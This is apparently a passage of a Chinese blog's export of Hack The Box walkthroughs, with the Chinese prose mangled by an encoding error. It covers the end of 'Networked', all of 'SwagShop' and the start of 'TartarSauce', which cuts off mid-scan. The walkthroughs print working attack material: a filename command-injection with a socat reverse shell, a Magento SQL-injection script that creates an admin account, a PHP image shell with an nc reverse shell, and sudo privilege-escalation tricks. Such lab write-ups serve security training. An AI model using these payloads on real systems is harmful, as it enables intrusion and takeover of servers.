ä¸ªå¯è¯»æ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nsh-4.2$ cat check_attack.php\n\ncat check_attack.php\n<?php\nrequire '/var/www/html/lib.php';\n$path = '/var/www/html/uploads/';\n$logpath = '/tmp/attack.log';\n$to = 'guly';\n$msg= '';\n$headers = \"X-Mailer: check_attack.php\\r\\n\";\n\n$files = array();\n$files = preg_grep('/^([^.])/', scandir($path));\n\nforeach ($files as $key => $value) {\n        $msg='';\n  if ($value == 'index.html') {\n        continue;\n  }\n  #echo \"-------------\\n\";\n\n  #print \"check: $value\\n\";\n  list ($name,$ext) = getnameCheck($value);\n  $check = check_ip($name,$value);\n\n  if (!($check[0])) {\n    echo \"attack!\\n\";\n    # todo: attach file\n    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);\n\n    exec(\"rm -f $logpath\");\n    exec(\"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\");\n    echo \"rm -f $path$value\\n\";\n    mail($to, $msg, $msg, $headers, \"-F$value\");\n  }\n}\n\n?>\n```\n```bash\nsh-4.2$ cat crontab.guly\ncat crontab.guly\n*/3 * * * * php /home/guly/check_attack.php\n```\nä» crontab.guly é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸‰åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ check\\_attack.php\n\nè¿™é‡Œä¼šå¼•å…¥ä¸€ä¸ªåº“æ–‡ä»¶ `/var/www/html/lib.php` \n\nä½†æ˜¯å¯æƒœçš„æ˜¯ï¼Œæˆ‘ä»¬æ²¡æœ‰æƒé™ä¿®æ”¹å®ƒ\n\nä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æˆ‘å‘ç°æ˜¯å¯æ§çš„ï¼Œä¸Šä¼ æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å(\\$value)æ˜¯å¯æ§çš„\n\né‚£ä¹ˆé¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç©ºçš„æµ‹è¯•æ–‡ä»¶ï¼Œå¹¶å°†å®ƒæ”¾å…¥ä¸Šä¼ æ–‡ä»¶å¤¹ä¸­\n\n```bash\ncd /var/www/html/uploads\ntouch \"test.txt\"\n```\nç°åœ¨æˆ‘ä»¬å°†â€œtest.txtâ€åˆ†é…ç»™ \\$valueï¼Œæ‰§è¡Œ php è„šæœ¬å¹¶æŸ¥çœ‹è¾“å‡º\n\n```bash\nphp /home/guly/check_attack.php\n\nsh-4.2$ php /home/guly/check_attack.php\nphp /home/guly/check_attack.php\nattack!\nrm -f /var/www/html/uploads/test.txt\n```\nè¿™è¡¨æ˜æ–‡ä»¶åï¼ˆ\\$valueï¼‰é™„åŠ åˆ° \"/var/www/html/uploads\" çš„æœ«å°¾ã€‚\n\næ‰€ä»¥åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶çš„éƒ¨åˆ†æ˜¯ \"rm -f /var/www/html/uploads/test.txt\"\n\nåœ¨è„šæœ¬ä¸­ï¼Œæˆ‘æ­£åœ¨æ“æ§çš„ä»£ç æ˜¯\n\n```bash\nexec(\"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\");\n```\næ‰€ä»¥æˆ‘å‡†å¤‡åˆ›å»ºä¸€ä¸ªä»¥åˆ†å·å¼€å¤´å¹¶ä»¥å‘½ä»¤ç»“å°¾çš„æ–‡ä»¶åï¼Œæ¥è‡ªå®šä¹‰æ‰§è¡Œæˆ‘ä»¬çš„ php exec() å‡½æ•°\n\n```bash\nexec(\"nohup /bin/rm -f $path ; command-to-inject > /dev/null 2>&1 &\");\n```\nokï¼Œæˆ‘ä»¬æ­£å¼å¼€å§‹\n\n```bash\ntouch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\n\nsh-4.2$ touch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\ntouch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\ntouch: cannot touch '; nc 10.10.16.3 5555 -e \\'/bin/bash\\'': No such file or directory\n```\nè¿™è¾¹ä¼¼ä¹ç”¨ netcat æ‰§è¡Œæ¯”è¾ƒéº»çƒ¦ï¼Œåæ–œæ çš„åŸå› å§ï¼Œæ‡’å¾—å¼„ç¼–ç äº†ï¼Œç”¨ socat è¯•è¯•å§\n\n```bash\nsocat file:`tty`,raw,echo=0 tcp-listen:5555\n```\nç„¶åå»åˆ›å»ºæˆ‘ä»¬çš„æ–‡ä»¶å\n\n```bash\ntouch \"; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555\" \n```\nç„¶åå†å»æ‰§è¡Œä¸€ä¸‹ php è„šæœ¬\n\n```bash\nphp /home/guly/check_attack.php\n\nsh-4.2$ php /home/guly/check_attack.php\nphp /home/guly/check_attack.php\nattack!\n/bin/rm: cannot remove '/var/www/html/uploads/': Is a directory\nrm -f /var/www/html/uploads/; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# socat file:`tty`,raw,echo=0 tcp-listen:5555\nbash-4.2$ whoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\nè¿™è¾¹ç¡®å®å¯ä»¥è¢«æ‰§è¡Œï¼Œç”±äºæ˜¯æˆ‘ä»¬è°ƒç”¨çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ apache æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»è®©è„šæœ¬è‡ªåŠ¨æ‰§è¡Œå§\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# socat file:`tty`,raw,echo=0 tcp-listen:5555\n[guly@networked ~]$ whoami&&id\nguly\nuid=1000(guly) gid=1000(guly) groups=1000(guly)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n```bash\n[guly@networked ~]$ cat user.txt \nc41daff87304452dde58eae1751e49b6\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\n[guly@networked ~]$ sudo -l\nMatching Defaults entries for guly on networked:\n    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,\n    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\",\n    env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\",\n    env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\",\n    env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\",\n    env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\",\n    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\n\nUser guly may run the following commands on networked:\n    (root) NOPASSWD: /usr/local/sbin/changename.sh\n```\nå¯ä»¥è°ƒç”¨ root æƒé™æ‰§è¡Œ `/usr/local/sbin/changename.sh` è„šæœ¬ï¼Œå…ˆå»çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒé™è¿˜æœ‰å¹²ä»€ä¹ˆçš„\n\n```bash\n[guly@networked ~]$ ls -la /usr/local/sbin/changename.sh\n-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh\n\n[guly@networked ~]$ cat /usr/local/sbin/changename.sh\n#!/bin/bash -p\ncat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF\nDEVICE=guly0\nONBOOT=no\nNM_CONTROLLED=no\nEoF\n\nregexp=\"^[a-zA-Z0-9_\\ /-]+$\"\n\nfor var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\n        echo \"interface $var:\"\n        read x\n        while [[ ! $x =~ $regexp ]]; do\n                echo \"wrong input, try again\"\n                echo \"interface $var:\"\n                read x\n        done\n        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly\ndone\n  \n/sbin/ifup guly0\n```\nè¿™é‡Œæ‰¾åˆ°ä¸€ç¯‡å‚è€ƒæ–‡ç« \n\n> [https://vulmon.com/exploitdetails?qidtp=maillist\\_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)\n\nè¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯åœ¨æ‰§è¡Œ `/usr/local/sbin/changename.sh` è„šæœ¬åï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥å››ä¸ªå‚æ•°ï¼Œå…¶ä¸­çš„ name å‚æ•°æˆ‘ä»¬æ˜¯å¯ä»¥æ³¨å…¥å‘½ä»¤çš„\n\næˆ‘ä»¬å»æ‰§è¡Œ\n\n```bash\n[guly@networked ~]$ sudo /usr/local/sbin/changename.sh\ninterface NAME:\ntest bash\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n^C\n[guly@networked ~]$ clear\nTERM environment variable not set.\n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ sudo /usr/local/sbin/changename.sh\ninterface NAME:\ntest bash\ninterface PROXY_METHOD:\ntest\ninterface BROWSER_ONLY:\ntest\ninterface BOOTPROTO:\ntest\n[root@networked network-scripts]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\n[root@networked network-scripts]# cat /root/root.txt \nff05b3ceb986ab66f5728c7cb82e67de\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶\n\n","tags":["Hackthebox"]},{"title":"SwagShop - Hackthebox","url":"/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/","content":"\n# Hackthebox - SwagShop\n# é¶åœºä¿¡æ¯\n![](Hackthebox-SwagShop/zPQUsyBqWm1oHEPbpSqzKqcrZv6oNvwoXeehhWuyVb8.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-SwagShop/uQuwYY2U21Yqpe5SnsAWqRDF8u961yCU_ScSxk1GN1I.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 02:26 CST\nWarning: 10.10.10.140 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.140\nHost is up (0.078s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)\n|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)\n|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Did not follow redirect to http://swagshop.htb/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/17%OT=22%CT=1%CU=30863%PV=Y%DS=2%DC=T%G=Y%TM=63EE758\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1\nOS:1NW7%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 993/tcp)\nHOP RTT       ADDRESS\n1   117.05 ms 10.10.16.1\n2   76.51 ms  10.10.10.140\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 37.68 seconds\n```\n## Http\nè¿™è¾¹ http ä¼šè·³è½¬åˆ°åŸŸå `swagshop.htb` ï¼Œå»åŠ å…¥ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.10.140 swagshop.htb >> /etc/hosts\n```\n![](Hackthebox-SwagShop/8dSUb1QixmVfXpeBk1mdzduFWb1_DdBqZfTm4cixWMU.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªå•†åŸï¼Œåº•éƒ¨å¯ä»¥å‘ç°è¿™æ˜¯ 2014 å¹´ç‰ˆæœ¬çš„ Magento\n\nå»æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# searchsploit magento      \n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\neBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                     | php/webapps/38573.txt\neBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                          | php/webapps/38651.txt\nMagento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                               | php/webapps/32808.txt\nMagento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                         | php/webapps/32809.txt\nMagento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                        | php/webapps/32810.txt\nMagento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                   | php/webapps/39838.php\nMagento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                     | php/webapps/37811.py\nMagento eCommerce - Local File Disclosure                                                                                                                                        | php/webapps/19793.txt\nMagento eCommerce - Remote Code Execution                                                                                                                                        | xml/webapps/37977.py\nMagento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                                      | php/webapps/50896.txt\nMagento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                           | php/webapps/35996.txt\nMagento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                      | php/webapps/35052.txt\nMagento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                     | php/webapps/48135.php\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™è¾¹å‘ç°æœ‰ä¸€ä¸ª RCE çš„æ¼æ´\n\n# æ¼æ´åˆ©ç”¨\næ‹·è´åˆ°æœ¬åœ°åå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nimport requests\nimport base64\nimport sys\n\ntarget = \"http://target.com/\"\n\nif not target.startswith(\"http\"):\n    target = \"http://\" + target\n\nif target.endswith(\"/\"):\n    target = target[:-1]\n\ntarget_url = target + \"/admin/Cms_Wysiwyg/directive/index/\"\n\nq=\"\"\"\nSET @SALT = 'rp';\nSET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));\nSELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;\nINSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());\nINSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');\n\"\"\"\n\n\nquery = q.replace(\"\\n\", \"\").format(username=\"forme\", password=\"forme\")\npfilter = \"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}\".format(query)\n\n# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}\nr = requests.post(target_url,\n                  data={\"___directive\": \"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ\",\n                        \"filter\": base64.b64encode(pfilter),\n                        \"forwarded\": 1})\nif r.ok:\n    print \"WORKED\"\n    print \"Check {0}/admin with creds forme:forme\".format(target)\nelse:\n    print \"DID NOT WORK\"\n```\n```bash\nimport requests\nimport base64\nimport sys\n\ntarget = \"http://swagshop.htb/index.php\"\n\nif not target.startswith(\"http\"):\n    target = \"http://\" + target\n\nif target.endswith(\"/\"):\n    target = target[:-1]\n\ntarget_url = target + \"/admin/Cms_Wysiwyg/directive/index/\"\n\nq=\"\"\"\nSET @SALT = 'rp';\nSET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));\nSELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;\nINSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());\nINSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');\n\"\"\"\n\n\nquery = q.replace(\"\\n\", \"\").format(username=\"lucifiel\", password=\"lucifiel\")\npfilter = \"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}\".format(query)\n\n# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}\nr = requests.post(target_url,\n                  data={\"___directive\": \"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ\",\n                        \"filter\": base64.b64encode(pfilter),\n                        \"forwarded\": 1})\nif r.ok:\n    print \"WORKED\"\n    print \"Check {0}/admin with creds lucifiel:lucifiel\".format(target)\nelse:\n    print \"DID NOT WORK\"\n```\næ ¹æ®æˆ‘ä»¬éœ€è¦çš„è¿›è¡Œä¿®æ”¹ï¼Œå°†ç¬¬äº”è¡Œçš„åœ°å€æ›´æ”¹ä¸º `http://swagshop.htb/index.php` ï¼Œå°†ç¬¬äºŒåå››è¡Œçš„è´¦å·å¯†ç æ›´æ”¹ä¸ºæˆ‘ä»¬éœ€è¦çš„è´¦å·å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# python2 exploit.py\nWORKED\nCheck http://swagshop.htb/index.php/admin with creds lucifiel:lucifiel\n```\nç„¶åå»è¿›è¡Œç™»å½•\n\n![](Hackthebox-SwagShop/_mfIGM68zpBpt8C6RUIHIXZv0OHVxYnqWKpbeskWGNU.png)\n\n![](Hackthebox-SwagShop/Wxh-7zmWK-HJZlaPWZxoORfY5ngcNPfGSYqGQGWNCrE.png)\n\næˆåŠŸç™»å½•\n\n> [https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)\n\né€šè¿‡ç¿»æ‰¾ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ¼æ´ç›¸å…³çš„æ–‡æ¡£\n\nè¿™é‡Œä¾æ¬¡ç‚¹å‡» System â€“> Configuration â€“> Advanced â€“> Developer â€“> Template Settings â€“> Allow Symlinks\n\nç„¶åå°†å®ƒè®¾ç½®ä¸º yesï¼Œç„¶åç‚¹å‡» save config ä¿å­˜\n\næ¥ç€åˆ¶ä½œå›¾ç‰‡é©¬\n\n```bash\necho '<?php' >> shell.php.png\necho 'passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f\");'>> shell.php.png\necho '?>' >> shell.php.png\n```\nç„¶åå†ä¾æ¬¡ç‚¹å‡» Catalog -> Manager Categories è¿›è¡Œä¸Šä¼ \n\n![](Hackthebox-SwagShop/5duE0kVkyV23MlyNlnBNNaOsvQaUDspLzTR73iyTuaI.png)\n\n![](Hackthebox-SwagShop/KrCwr7krMARPPzcPFBS3yTn-KwV0kiNvNs2kBF7-Fps.png)\n\nç„¶åå»æŸ¥çœ‹ï¼Œä¼šå‘ç°æˆ‘ä»¬çš„å›¾ç‰‡å·²ç»ä¼ ä¸Šå»äº†\n\næœ€åä¸€æ­¥æ˜¯åˆ›å»ºé€šè®¯æ¨¡æ¿å…µæ³¨å…¥æˆ‘ä»¬çš„ payload\n\nç‚¹å‡» Newsletter -> Newsletter Templates -> Add New Template\n\n![](Hackthebox-SwagShop/ouptBGduWPH5cJU09nNCP2JeL0x5mHS5yVI7vuNpazQ.png)\n\n```bash\n{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}\n```\nè¿™æ˜¯æˆ‘ä»¬è¦å¡«å…¥çš„å†…å®¹\n\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\næœ€åæˆ‘ä»¬ç‚¹å‡» Preview Template é¢„è§ˆæ¨¡æ¿\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.7] from (UNKNOWN) [10.10.10.140] 33206\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\nå¾—åˆ°äº†ä¸€ä¸ª shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n# æƒé™æå‡\n```bash\n$ sudo -l\nMatching Defaults entries for www-data on swagshop:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on swagshop:\n    (root) NOPASSWD: /usr/bin/vi /var/www/html/*\n```\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ root æƒé™è°ƒç”¨ /sur/bin/vi æ‰§è¡Œæ‰€æœ‰ /var/www/html/\\* çš„æ–‡ä»¶\n\n```bash\n$ ls -la /var/www/html/\ntotal 720\ndrwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 .\ndrwxr-xr-x  3 root     root       4096 Nov 12  2021 ..\n-rw-r--r--  1 www-data www-data   5667 May  7  2014 .htaccess\n-rw-r--r--  1 www-data www-data   4568 May  7  2014 .htaccess.sample\n-rw-r--r--  1 www-data www-data  10679 May  7  2014 LICENSE.html\n-rw-r--r--  1 www-data www-data  10410 May  7  2014 LICENSE.txt\n-rw-r--r--  1 www-data www-data  10421 May  7  2014 LICENSE_AFL.txt\n-rw-r--r--  1 www-data www-data 585086 May  7  2014 RELEASE_NOTES.txt\n-rw-r--r--  1 www-data www-data   2834 May  7  2014 api.php\ndrwxr-xr-x  6 www-data www-data   4096 Nov 12  2021 app\n-rw-r--r--  1 www-data www-data   2831 May  7  2014 cron.php\n-rw-r--r--  1 www-data www-data    717 May  7  2014 cron.sh\ndrwxr-xr-x  3 www-data www-data   4096 Nov 12  2021 errors\n-rw-r--r--  1 www-data www-data   1150 May  7  2014 favicon.ico\n-rw-r--r--  1 www-data www-data   5979 May  7  2014 get.php\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 includes\n-rw-r--r--  1 www-data www-data   2642 May  7  2014 index.php\n-rw-r--r--  1 www-data www-data   2366 May  7  2014 index.php.sample\n-rw-r--r--  1 www-data www-data   6441 May  7  2014 install.php\ndrwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 js\ndrwxr-xr-x 13 www-data www-data   4096 Nov 12  2021 lib\n-rw-r--r--  1 www-data www-data   1319 May  7  2014 mage\ndrwxrwxrwx  8 www-data www-data   4096 Nov 12  2021 media\n-rw-r--r--  1 www-data www-data    886 May  7  2014 php.ini.sample\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 pkginfo\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 shell\ndrwxr-xr-x  5 www-data www-data   4096 Nov 12  2021 skin\ndrwxr-xr-x 10 www-data www-data   4096 Feb 16 13:54 var\n```\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ`/var/www/html/` ç›®å½•ä¸‹çš„ä¸œè¥¿è¿˜æ˜¯æŒºå¤šçš„\n\n> [https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/)\n\næ ¹æ® `GTFOBins` ä¸Šçš„æç¤ºï¼Œæˆ‘ä»¬åœ¨ vi ç¼–è¾‘ä¸­ï¼Œä½¿ç”¨ :shell å³å¯è·å¾—æƒé™\n\né‚£æˆ‘ä»¬å»éšä¾¿æ‰§è¡Œä¸€ä¸ªå§\n\n```bash\nsudo /usr/bin/vi /var/www/html/index.php\n```\næ‰§è¡ŒåæŒ‰ ESCï¼Œç„¶åè¾“å…¥ `:shell` å³å¯\n\n```bash\nroot@swagshop:/var/www/html# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nroot@swagshop:/var/www/html# cat /home/haris/user.txt\ncat /home/haris/user.txt\n370cc7d01561ab4da02e53de7ef8d799\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n```bash\nroot@swagshop:/var/www/html# cat /root/root.txt\ncat /root/root.txt\n295e684ef53b47af9e6fc69a3301ee26\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"TartarSauce - Hackthebox","url":"/2023/02/11/Hackthebox/Medium/Hackthebox-TartarSauce/","content":"\n# Hackthebox - TartarSauce\n# é¶åœºä¿¡æ¯\n![](Hackthebox-TartarSauce/r_-P599O8q_Wbsy3FMDnFnaH4SxI9BezyiAMBx5z8yo.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-TartarSauce/Dp0ihy89fshrjZMpPIPwXyNmpCeR1C9YqAUc-73dCc8.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.88\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 CST\nWarning: 10.10.10.88 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.88\nHost is up (0.095s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 5 disallowed entries \n| /webservices/tar/tar/source/ \n| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ \n|_/webservices/developmental/ /webservices/phpmyadmin/\n|_http-title: Landing Page\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 